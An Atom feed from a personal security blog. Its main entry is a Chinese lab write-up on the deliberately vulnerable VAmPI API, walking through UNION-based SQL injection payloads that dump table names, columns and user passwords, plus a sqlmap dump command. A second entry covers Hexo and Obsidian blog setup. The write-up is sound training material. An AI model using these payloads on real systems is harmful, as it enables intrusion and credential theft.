<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yuuki&#39;s blog</title>
  
  <subtitle>subtitle</subtitle>
  <link href="https://blog.uuki.moe/atom.xml" rel="self"/>
  
  <link href="https://blog.uuki.moe/"/>
  <updated>2023-06-01T23:47:46.572Z</updated>
  <id>https://blog.uuki.moe/</id>
  
  <author>
    <name>yuuki</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Lab - VAmPI - 环境搭建 &amp; SQL Injection</title>
    <link href="https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/"/>
    <id>https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/</id>
    <published>2023-05-30T19:50:16.000Z</published>
    <updated>2023-06-01T23:47:46.572Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/erev0s/VAmPI">VAmPI</a> 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 <a href="https://erev0s.com/blog/vampi-vulnerable-api-security-testing/">https://erev0s.com/blog/vampi-vulnerable-api-security-testing/</a> 可以看到更加全面的介绍。</p><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>有三种搭建环境的方式, 分别是 Python, docker, docker-compose。本文使用 Python 搭建。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/erev0s/VAmPI.git</span><br><span class="line"><span class="built_in">cd</span> VAmPI/</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>将环境拉倒本地后可以直接使用 <code>python3 app.py</code> 运行。在 <code>openapi_specs</code> 目录下有一个 <code>openapi3.yml</code>, 可以用于在 <a href="https://editor.swagger.io/">swagger editor</a> 或 Postman 等工具生成 API 文档。</p><p>为了避免与较新版本的 MacOS AirPlay Receiver 的端口冲突, 需要修改 <code>app.py</code> 与 <code>openapi3.yml</code> 内的端口号为 <code>5001</code></p><p>使用 <code>python3 app.py</code> 启动服务后浏览器访问 <code>http://10.0.0.100:5001/</code>。在 Postman 导航栏选择 <strong>File</strong> -&gt; <strong>Import</strong> 导入 <code>openapi3.yml</code> 配置文件开始测试。</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>导致 SQL 注入的查询用户名接口为 <code>/users/v1/&#123;username&#125;</code>。功能函数 <code>get_user</code> 代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> vuln:  <span class="comment"># SQLi Injection</span></span><br><span class="line">        user_query = <span class="string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27;&quot;</span></span><br><span class="line">        query = db.session.execute(text(user_query))</span><br><span class="line">        ret = query.fetchone()</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            fin_query = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#x27;</span> % (ret[<span class="number">1</span>], ret[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fin_query = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fin_query = User.query.filter_by(username=username).first()</span><br><span class="line">    <span class="keyword">return</span> fin_query</span><br></pre></td></tr></table></figure><p>靶场 SQL 环境使用的是 SQLite 数据库, 需要注意 SQLite 没有库这个概念的, 查询语句中不需要指定数据库。</p><p>查询语句 <code>user_query = f&quot;SELECT * FROM users WHERE username = &#39;&#123;username&#125;&#39;&quot;</code> 为<strong>字符型查询</strong>, 注入时使用单引号闭合。</p><p>查询结果 <code>fin_query = &#39;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#39; % (ret[1], ret[3])</code> 使用键 1 和 3 的位置作为响应结果, 故<strong>数据回显位</strong>在 2 和 4。</p><h3 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h3><p>当用户存在将返回 <code>username</code>, <code>email</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>当用户不存在 <code>message</code> 将返回 <code>User not found</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fail&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>单引号 <code>&#39;</code> 报错, 添加注释符号后页面正常显示, 判断注入点存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:5001/users/v1/1       # 正常</span><br><span class="line">http://localhost:5001/users/v1/1&#x27;      # 报错</span><br><span class="line">http://localhost:5001/users/v1/1&#x27; --+  # 正常</span><br></pre></td></tr></table></figure><p><img src="/../assets/VAmPI-The-Vulnerable-API/image-20230601_061815.png" class="lazyload" data-srcset="/../assets/VAmPI-The-Vulnerable-API/image-20230601_061815.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>在这里页面回显了查询语句 <code>SELECT * FROM users WHERE username = &#39;1&#39;&#39;</code> 明确指出这是字符型的注入点, 省略 <strong><a href="https://pentestnote.uuki.moe/pentesting-web/sql-injection">确定闭合方式</a></strong> 这一步骤</p><h3 id="判断查询结果列数"><a href="#判断查询结果列数" class="headerlink" title="判断查询结果列数"></a>判断查询结果列数</h3><p>使用 ORDER BY 语句判断查询结果列数。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 4 --+  # 正常</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 5 --+  # 正常</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 6 --+  # 报错</span><br></pre></td></tr></table></figure><p><img src="/../assets/VAmPI-The-Vulnerable-API/image-20230601_063959.png" class="lazyload" data-srcset="/../assets/VAmPI-The-Vulnerable-API/image-20230601_063959.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>当排序语句为 <code>ORDER BY 6</code> 时, 页面将报错, 判断查询结果为 5 列。</p><h3 id="判断数据回显位"><a href="#判断数据回显位" class="headerlink" title="判断数据回显位"></a>判断数据回显位</h3><p>使用 <code>UNION</code> 联合查询判断数据回显位。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,2,3,4,5 --+</span><br></pre></td></tr></table></figure><p>本身 <code>username = 1</code> 结果并不存在, 服务器将会返回 UNION 查询语句的结果, 响应结果中包含 2, 4 , 说明 2 和 4 的位置是数据回显位。</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="查询数据库信息"><a href="#查询数据库信息" class="headerlink" title="查询数据库信息"></a>查询数据库信息</h3><p>使用 sqlite 查看版本信息函数 <code>sqlite_version()</code> 查询数据库版本信息</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,sqlite_version(),3,4,5 FROM sqlite_schema --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601101335</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,sqlite_version(),3,4,5%20FROM%20sqlite_schema%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.39.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="检索数据库数据"><a href="#检索数据库数据" class="headerlink" title="检索数据库数据"></a>检索数据库数据</h3><h4 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type=&#x27;table&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601102601</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,group_concat(tbl_name),3,4,5%20FROM%20sqlite_master%20WHERE%20type=&#x27;table&#x27;%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;users,books&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h4><blockquote><p>注意, 这里 <code>pragma_table_info(&#39;users&#39;)</code> 用于获取指定表的列信息，其中<code>name</code>是列名的字段。</p></blockquote><p>查询 <code>users</code> 表所有字段</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,username,password,email,admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>查询 <code>books</code> 表所有字段</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;books&#x27;) --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,book_title,secret_content,user_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><p>查询 <code>users</code> 表下 <code>username</code> 和 <code>password</code> 字段的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,username,password)),3,4,5 FROM &#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name1@pass1,name2@pass2,admin@pass1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>查询 <code>books</code> 表下 <code>book_title</code> 和 <code>secret_content</code> 字段的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,book_title,secret_content)),3,4,5 FROM &#x27;books&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bookTitle19@secret for bookTitle19,bookTitle56@secret for bookTitle56,bookTitle8@secret for bookTitle8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>sqlmap</code> 对 URL 中的路径参数进行注入测试时, 可以使用星号 <code>*</code> 表示路径参数的位置, 使用 <code>sqlmap -u &quot;http://127.0.0.1:5001/users/v1/*&quot; --dump</code> 同样可以检索出数据库内所有的数据。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/erev0s/VAmPI&quot;&gt;VAmPI&lt;/a&gt; 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 &lt;a href=&quot;https://erev0s.com/blog/vampi-vulnerable-api-security-testing/&quot;&gt;https://erev0s.com/blog/vampi-vulnerable-api-security-testing/&lt;/a&gt; 可以看到更加全面的介绍。&lt;/p&gt;</summary>
    
    
    
    <category term="sec" scheme="https://blog.uuki.moe/categories/sec/"/>
    
    
    <category term="Pentesting API" scheme="https://blog.uuki.moe/tags/Pentesting-API/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://blog.uuki.moe/2023/05/28/hello-world/"/>
    <id>https://blog.uuki.moe/2023/05/28/hello-world/</id>
    <published>2023-05-27T16:00:00.000Z</published>
    <updated>2023-05-28T12:49:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to my blog. 👋 这是第一个帖子, 记录了这个站点的诞生。</p><span id="more"></span><details blue><summary> TimeLog </summary>              <div class='content'>              <div class="timeline"><div class="timenode"><div class="meta"><p><p>2023-05-28</p></p></div><div class="body"><p>编辑文章, 发布博客 (<a href="https://uuki.blog.moe/">https://uuki.blog.moe</a>)</p></div></div><div class="timenode"><div class="meta"><p><p>2023-05-29</p></p></div><div class="body"><p>补充<a href="#2-%E9%9B%86%E6%88%90-Obsidian">集成 Obsidian</a> 部分内容</p></div></div><div class="timenode"><div class="meta"><p><p>2023-05-30</p></p></div><div class="body"><ol><li><p>关闭光标样式</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">custom_css:</span></span><br><span class="line"><span class="attr">cursor:</span></span><br><span class="line"><span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></li><li><p>关闭平滑滚动</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">scroll_smooth:</span> <span class="literal">false</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></li></ol></div></div></div>              </div>            </details><h2 id="1-初始化-Hexo-blog"><a href="#1-初始化-Hexo-blog" class="headerlink" title="1. 初始化 Hexo blog"></a>1. 初始化 Hexo blog</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 初始化</span></span><br><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line">hexo init</span><br><span class="line">git init .</span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装主题</span></span><br><span class="line"><span class="comment"># https://github.com/volantis-x/hexo-theme-volantis/</span></span><br><span class="line">git submodule add https://github.com/volantis-x/hexo-theme-volantis.git themes/volantis</span><br><span class="line"><span class="built_in">cp</span> themes/volantis/_config.yml ./_config.volantis.yml</span><br></pre></td></tr></table></figure><h3 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h3><figure class="highlight diff"><figcaption><span>_config.volantis.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="addition">+ 131 - navbar: # 导航栏</span></span><br><span class="line"><span class="deletion">- 171 - cover: # 头图</span></span><br><span class="line"><span class="addition">+ 214 - pages: # 友链页面配置</span></span><br><span class="line"><span class="addition">+ 387 - comments: # 评论</span></span><br><span class="line"><span class="addition">+ 563 - sidebar: # 侧边栏</span></span><br><span class="line"><span class="addition">+ 728 - site_footer: # 页脚</span></span><br><span class="line"><span class="addition">+ 817 - plugins: # 插件</span></span><br><span class="line"><span class="addition">+ 1053 - rightmenus: # 右键菜单</span></span><br></pre></td></tr></table></figure><h3 id="安装拓展插件"><a href="#安装拓展插件" class="headerlink" title="安装拓展插件"></a>安装拓展插件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 音乐播放器</span></span><br><span class="line"><span class="comment"># https://aplayer.js.org/#/zh-Hans/</span></span><br><span class="line">npm install aplayer --save</span><br><span class="line"></span><br><span class="line"><span class="comment">## Hexo 搜索</span></span><br><span class="line"><span class="comment"># https://github.com/alexbruno/hexo-generator-json-content</span></span><br><span class="line">npm install hexo-generator-json-content --save</span><br><span class="line"></span><br><span class="line"><span class="comment">## Highlight</span></span><br><span class="line"><span class="comment"># https://highlightjs.org/static/demo/</span></span><br><span class="line"><span class="comment"># https://www.jsdelivr.com/package/npm/@highlightjs/cdn-assets?path=styles&amp;tab=files</span></span><br><span class="line">暂时没有启用, 而是使用 Hexo 内置的 Highlight</span><br><span class="line"></span><br><span class="line"><span class="comment">## RSS</span></span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">本地文件 atom.xml 会存在乱码, 部署到远程就没问题了</span><br><span class="line"></span><br><span class="line"><span class="comment">## Deploy</span></span><br><span class="line"><span class="comment"># https://github.com/hexojs/hexo-deployer-git</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h3 id="元数据盒子"><a href="#元数据盒子" class="headerlink" title="元数据盒子"></a>元数据盒子</h3><p>各种首页的 Front-matter</p><figure class="highlight markdown"><figcaption><span>about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: docs</span><br><span class="line">index: true</span><br><span class="line">title: About</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: category</span><br><span class="line">index: true</span><br><span class="line">title: Categories</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: tag</span><br><span class="line">index: true</span><br><span class="line">title: Tags</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>friends/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: friends</span><br><span class="line">index: true</span><br><span class="line">title: Links</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><h2 id="2-集成-Obsidian"><a href="#2-集成-Obsidian" class="headerlink" title="2. 集成 Obsidian"></a>2. 集成 Obsidian</h2><p>注意, 使用 Obsidian 打开 hexo 博客根目录作为仓库, 而不是 <code>_posts</code> 或其他路径</p><h3 id="本地保存图片"><a href="#本地保存图片" class="headerlink" title="本地保存图片"></a>本地保存图片</h3><blockquote><p>Custom Attachment Location: <a href="https://github.com/RainCat1998/obsidian-custom-attachment-location">https://github.com/RainCat1998/obsidian-custom-attachment-location</a></p></blockquote><p>参考如下参数进行配置</p><ul><li>Location for New Attachments: <code>source/assets/$&#123;filename&#125;</code></li><li>Pasted Image Name: <code>image-$&#123;date&#125;</code></li><li>Date Format: <code>YYYYMMDD_HHmmssSSS</code></li><li>Automatically rename attachment folder: 打开</li><li>Automatically rename attachment files: 打开</li></ul><p>直接在 Obsidian 内粘贴图片即可自动将图片保存在本地, 文件路径对应为 <code>source/assets/Markdown文件名称/image-时间戳</code></p><p><img src="/../assets/hello-world/image-20230529_232911.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230529_232911.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="创建文章模板"><a href="#创建文章模板" class="headerlink" title="创建文章模板"></a>创建文章模板</h3><blockquote><p>Templater: <a href="https://silentvoid13.github.io/Templater/">https://silentvoid13.github.io/Templater/</a></p></blockquote><p><strong>创建模板文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line"><span class="built_in">mkdir</span> template</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## template/post.md</span></span><br><span class="line">title: &lt;% tp.file.title %&gt;</span><br><span class="line">date: &lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;</span><br><span class="line">author: Yuuki</span><br><span class="line">updated: </span><br><span class="line">cover: </span><br><span class="line">tags: [&lt;% tp.system.prompt(&quot;Tag&quot;, &quot;&quot;) %&gt;]</span><br><span class="line">categories: [&lt;% tp.system.prompt(&quot;Category&quot;, &quot;&quot;) %&gt;]</span><br><span class="line"></span><br><span class="line"><span class="section">## template/timeNow.md</span></span><br><span class="line">&lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;</span><br><span class="line"></span><br><span class="line"><span class="section">## template/title.md</span></span><br><span class="line">&lt;% tp.file.title %&gt;</span><br></pre></td></tr></table></figure><p><strong>修改配置文件</strong></p><ul><li>设置模板文件夹: <strong>General Settings</strong> -&gt; <strong>Template folder location</strong>: <code>template</code></li><li>勾选 <strong>Enable Folder Templates</strong>: 允许指定目录的文件在新建时自动调用模板</li><li>配置文件选择 <strong>Folder Templates</strong> -&gt; <strong>Add New</strong>: Folder&#x3D;<code>source/_posts</code>, Template&#x3D;<code>template/post.md</code> 指示 <code>_posts</code> 目录下的文件在新建时自动调用 <code>post.md</code> 模板文件</li></ul><h3 id="可视化管理文章"><a href="#可视化管理文章" class="headerlink" title="可视化管理文章"></a>可视化管理文章</h3><blockquote><p>MAKE.md <a href="https://github.com/Make-md/makemd">https://github.com/Make-md/makemd</a></p></blockquote><p>注意, 插件在管理文件源属性时将 tag 作为标签管理, 与 Hexo 冲突, 需要进入插件配置页面, 找到 <strong>Context</strong> -&gt; 取消勾选 Contexts</p><p>创建自定义空间 Archive 用于管理 <code>_posts</code> 目录下的所有文章</p><p><img src="/../assets/hello-world/image-20230528_184910.gif" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_184910.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>像是本篇文章的 Front-matter 原属性内包含的 <code>categories=dev</code> (分类) 和 <code>tags=blog</code> (标签), 都可以作为 MAKE.md 插件的分许一句, 在创建空间时, 选择 New Smart Space 可以实现对不同分类或不同标签的文章进行单独的管理。</p><p><img src="/../assets/hello-world/image-20230529_232655.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230529_232655.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="清理无用附件"><a href="#清理无用附件" class="headerlink" title="清理无用附件"></a>清理无用附件</h3><p>Plan A: 依赖于 <a href="https://github.com/Johnson0907/obsidian-file-cleaner">File Cleaner</a> 插件</p><p>因为这个插件默认检索全仓库, 需要多加一点规则避免删除有用的文件</p><p>在删除之后, 右上角会弹窗提示, 如果有意外情况记得在清空废纸篓之前手动检查</p><figure class="highlight text"><figcaption><span>Excluded Folders</span></figcaption><table><tr><td class="code"><pre><span class="line">node_modules/</span><br><span class="line">scaffolds/</span><br><span class="line">template/</span><br><span class="line">themes/</span><br></pre></td></tr></table></figure><p>Plan B: 使用 Find orphaned files and broken links 插件</p><p>Find orphaned files and broken links 是一个可以用于发现空文件, 没有链接的文件的插件。</p><p>配置要更加复杂, 我也没有采用这种方案</p><h2 id="3-Hexo-半自动化部署"><a href="#3-Hexo-半自动化部署" class="headerlink" title="3. Hexo 半自动化部署"></a>3. Hexo 半自动化部署</h2><h3 id="半自动化脚本-Shell"><a href="#半自动化脚本-Shell" class="headerlink" title="半自动化脚本 (Shell)"></a>半自动化脚本 (Shell)</h3><p>基于 MacOS 操作系统</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hexo status <span class="comment"># 判断运行状态</span></span><br><span class="line">./hexo restart <span class="comment"># 重新启动</span></span><br><span class="line">./hexo start <span class="comment"># 启动</span></span><br><span class="line">./hexo stop <span class="comment"># 停止</span></span><br><span class="line">./hexo deploy <span class="comment"># 部署至 GitHub</span></span><br></pre></td></tr></table></figure><p>编写 bash 脚本用于自动化操作 hexo</p><figure class="highlight bash"><figcaption><span>hexo.sh</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 hexo 进程状态</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_status</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is running [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is not running...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 终止 hexo 进程</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">stop_hexo</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is running [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">        <span class="built_in">kill</span> <span class="variable">$pid</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is stoped...&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is not running...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 hexo 进程</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">restart_hexo</span></span>() &#123;</span><br><span class="line">    stop_hexo</span><br><span class="line">    start_hexo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 hexo 进程</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">start_hexo</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span 